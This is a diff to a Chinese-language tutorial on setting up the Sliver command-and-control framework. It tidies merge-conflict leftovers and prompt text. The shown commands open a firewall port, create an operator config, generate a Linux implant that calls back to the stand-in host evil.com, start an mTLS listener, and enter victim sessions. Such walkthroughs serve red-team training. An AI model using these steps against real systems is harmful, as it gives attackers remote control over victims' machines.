@@ -27,19 +27,11 @@ Adversary Emulation Framework.
 └─$ sudo ufw allow 31337
 ```
 
-生成配置文件
-=======
 导出配置文件
+
 ```
 ┌──(nemo@debian)-[~]
 └─$ sliver-server operator -n nemo -l evil.com -p 31337 -s ~/.sliver
-```
-
-<<<<<<< HEAD
-开启多端控制
-
-```
-[server] sliver > multiplayer
 ```
 
 ### 2.2. Client
@@ -69,31 +61,31 @@ sliver > exit
 查看已加入的控制器
 
 ```
-[server] sliver > operators
+sliver > operators
 ```
 
 生成 Implant
 
 ```
-[server] sliver > generate -o linux -m evil.com:65135
+sliver > generate -o linux -m evil.com:65135
 ```
 
 监听 Implant
 
 ```
-[server] sliver > mtls -l 65135
+sliver > mtls -l 65135
 ```
 
 查看监听任务
 
 ```
-[server] sliver > jobs
+sliver > jobs
 ```
 
 等待目标执行 Implant 后查看会话
 
 ```
-[server] sliver > sessions
+sliver > sessions
 
  ID         Transport   Remote Address        Hostname   Username   Operating System   Health
 ========== =========== ===================== ========== ========== ================== =========
@@ -103,7 +95,7 @@ sliver > exit
 进入会话
 
 ```
-[server] sliver > use  685a7144
+sliver > use  685a7144
 ```
 
 断开会话
